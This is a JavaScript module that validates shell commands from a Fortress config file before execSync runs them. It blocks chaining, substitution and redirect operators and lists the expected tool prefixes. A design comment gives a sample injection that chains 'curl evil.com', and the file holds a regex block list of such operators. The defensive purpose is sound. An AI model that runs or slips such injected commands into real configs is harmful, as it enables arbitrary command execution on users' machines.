'use strict';

/**
 * Validates commands from fortress.config.js before shell execution.
 *
 * Fortress executes user-configured commands via execSync (shell mode).
 * A malicious fortress.config.js could inject arbitrary shell commands.
 * This validator rejects commands containing dangerous shell operators.
 *
 * Design decision: We block shell chaining/injection operators but allow
 * simple commands with flags. Commands like "npx eslint ." are fine.
 * Commands like "npx eslint . && curl evil.com" are blocked.
 */

// Shell operators that enable command chaining or injection
const DANGEROUS_PATTERNS = [
  /;\s*/,              // command separator: cmd1; cmd2
  /&&/,                // AND chain: cmd1 && cmd2
  /\|\|/,              // OR chain: cmd1 || cmd2
  /\|(?!\|)/,          // pipe: cmd1 | cmd2 (but not ||, handled above)
  /\$\(/,              // command substitution: $(cmd)
  /`/,                 // backtick substitution: `cmd`
  />\s*/,              // output redirect: cmd > file
  /<\s*/,              // input redirect: cmd < file
  /\$\{/,              // variable expansion: ${VAR}
  /\beval\b/,          // eval command
  /\bsource\b/,        // source command
  /\bexec\b/,          // exec command
];

// Known safe command prefixes — these are the tools Fortress is designed to run
const SAFE_PREFIXES = [
  'npx ', 'npm ', 'yarn ', 'pnpm ', 'bun ',
  'node ', 'tsc ', 'eslint ', 'biome ',
  'vitest ', 'jest ', 'mocha ',
];

/**
 * Validate a command string from fortress.config.js.
 * Returns { valid: true } or { valid: false, reason: string }.
 */
function validateCommand(command) {
  if (!command || typeof command !== 'string') {
    return { valid: false, reason: 'Command is empty or not a string' };
  }

  const trimmed = command.trim();

  if (trimmed.length === 0) {
    return { valid: false, reason: 'Command is empty' };
  }

  // Check for dangerous shell patterns
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(trimmed)) {
      return {
        valid: false,
        reason: `Command contains a disallowed shell operator: ${pattern.source}`,
      };
    }
  }

  // Warn if command doesn't start with a known safe prefix
  // (still allowed, just logged — we don't want to break custom setups)
  const hasSafePrefix = SAFE_PREFIXES.some(prefix => trimmed.startsWith(prefix));

  return { valid: true, knownSafe: hasSafePrefix };
}

module.exports = { validateCommand, DANGEROUS_PATTERNS, SAFE_PREFIXES };
